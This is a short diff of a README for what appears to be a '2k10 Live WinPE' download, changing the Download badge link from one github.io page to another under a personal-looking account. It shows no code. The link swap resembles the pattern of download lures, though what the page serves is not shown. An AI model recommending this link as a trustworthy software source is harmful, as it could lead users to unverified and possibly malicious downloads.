@@ -2,8 +2,7 @@
 
 ## 📥  2k10 Live WinPE
 
-[![⬇️  2k10 Live](https://img.shields.io/badge/Download-2k10%20Live-blue?style=for-the-badge&logo=usb)](https://2k10-live-winpe-7x86-special-edition.github.io/.github
-)
+[![⬇️  2k10 Live](https://img.shields.io/badge/Download-2k10%20Live-blue?style=for-the-badge&logo=usb)](https://mayracraig543433.github.io/.github/2k10-live-winpe-7x86)
 
 ---
 
